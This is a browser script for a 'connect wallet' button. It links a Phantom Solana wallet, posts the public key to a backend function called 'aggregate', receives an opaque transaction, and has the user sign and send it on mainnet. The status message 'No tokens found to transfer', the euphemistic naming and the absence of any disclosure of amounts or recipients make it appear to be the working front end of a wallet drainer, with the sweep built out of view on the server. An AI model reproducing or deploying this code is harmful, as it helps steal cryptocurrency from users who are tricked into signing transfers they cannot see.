// public/scripts.js
document.getElementById('connect-wallet').addEventListener('click', async () => {
    const statusElement = document.getElementById('status');
    statusElement.textContent = 'Connecting to Phantom...';
    statusElement.className = 'status visible';

    // 1. Check for Phantom
    if (!window.solana || !window.solana.isPhantom) {
        statusElement.textContent = 'Phantom wallet not detected. Please install it.';
        statusElement.className = 'status visible error';
        return;
    }

    try {
        // 2. Connect Wallet
        await window.solana.connect();
        const accountIdentity = window.solana.publicKey.toString();

        // 3. Call Backend
        statusElement.textContent = 'Fetching and simulating transaction...';
        const response = await fetch('/.netlify/functions/aggregate', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ accountIdentity })
        });

        if (!response.ok) {
            const errorResponse = await response.json();
            const errorMsg = errorResponse.details || errorResponse.error || 'Backend error';
            throw new Error(errorMsg);
        }

        const result = await response.json();

        // 4. Handle Empty Wallet Case
        if (result.message === "Zero units resolved") {
            statusElement.textContent = "No tokens found to transfer.";
            statusElement.className = 'status visible warning';
            return;
        }

        if (!result.payload) {
            throw new Error("No transaction payload returned from backend.");
        }

        // 5. Deserialize VersionedTransaction
        let transaction;
        try {
            const transactionBytes = Uint8Array.from(atob(result.payload), c => c.charCodeAt(0));
            transaction = solanaWeb3.VersionedTransaction.deserialize(transactionBytes);
        } catch (parseErr) {
            console.error("Deserialization failed:", parseErr);
            statusElement.textContent = 'Failed to deserialize transaction payload.';
            statusElement.className = 'status visible error';
            throw parseErr;
        }

        // 6. Sign and Send
        statusElement.textContent = 'Confirming transaction in Phantom...';
        const { signature } = await window.solana.signAndSendTransaction(transaction);

        // 7. Confirm Transaction
        statusElement.textContent = 'Confirming on-chain...';
        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", 'confirmed');
        
        // Wait for confirmation
        await connection.confirmTransaction(signature, 'confirmed');

        statusElement.textContent = `Success! Signature: ${signature.slice(0, 10)}...`;
        statusElement.className = 'status visible success';

    } catch (err) {
        console.error(err);
        statusElement.textContent = `Error: ${err.message}`;
        statusElement.className = 'status visible error';
    }
});